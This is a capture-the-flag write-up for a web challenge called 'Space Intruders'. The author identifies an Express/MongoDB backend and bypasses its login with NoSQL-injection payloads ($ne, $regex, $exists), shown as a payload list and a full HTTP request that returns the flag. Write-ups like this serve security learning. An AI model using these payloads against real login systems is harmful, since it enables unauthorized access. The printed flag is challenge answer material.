# Space Intruders

## Description
```
Our space ship was hacked a few days ago. We have made sure to improve our security posture by changing all default credentials. We made sure to stop invalid logins by limiting username input to a length of 3 including an equals, legacy software is a pain but it should be secure now.
```

## Writeup

Taking a look at the website. <br/>
![grafik](https://github.com/Aryt3/writeups/assets/110562298/4fdddeca-e1ce-41ce-b3eb-7bcc42613449)

I can find nothing of interest on the homepage. <br/>
![grafik](https://github.com/Aryt3/writeups/assets/110562298/6964dde3-bfe7-4bd7-b08b-558f0461a31c)

I tried some things but couldn't identify anything of interest, so let's move on to burp suite. <br/>
Taking a look at the normal response header. <br/>
```sh
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 3970
ETag: W/"f82-Qeg0GsBVKYfwIWZ7+XX4egP6CP8"
Date: Sat, 28 Oct 2023 20:21:43 GMT
Connection: close
```

From here I can deduct a few things. <br/>
First of all I can see `X-Powered-By: Express` which indicates that `express.js` is used in the backend. <br/>
In a lot of cases `express.js` runs together with `node.js` which is not that interesting. <br/>
The interesting thing to us is that this backend architecture often uses `MongoDB` or any kind of `NoSQL` databases. <br/>
Looking up some nosql type injections I chose to take a look at hacktrix. (https://book.hacktricks.xyz/pentesting-web/nosql-injection)<br/>

After trying some of those out I was able to receive error warnings like the following. <br/>
![grafik](https://github.com/Aryt3/writeups/assets/110562298/ec20c078-83f3-40be-834f-51cccb9a0643)

I concluded that I am on the right path and continued looking for working injections until I found 1 section. <br/>

### Basic authentication bypass
**Using not equal ($ne) or greater ($gt)**
```sh
#in URL
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null} }
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
```

Using the third URL injection with the following request body I got a hit. <br/>
```sh
POST /login HTTP/1.1
Host: spooky-space-intruder-web.chals.io
Content-Length: 45
Cache-Control: max-age=0
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://spooky-space-intruder-web.chals.io
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://spooky-space-intruder-web.chals.io/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

username[$exists]=true&password[$exists]=true
```

In the response body I than received the flag. <br/>
```sh
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 38
ETag: W/"26-f/zhwqxyLoLG56Qooha0tkaX91I"
Date: Sat, 28 Oct 2023 20:30:15 GMT
Connection: close

NICC{d1D_y0U_Kn0W_m0NgOdB1$_w3b$ca13?}
```



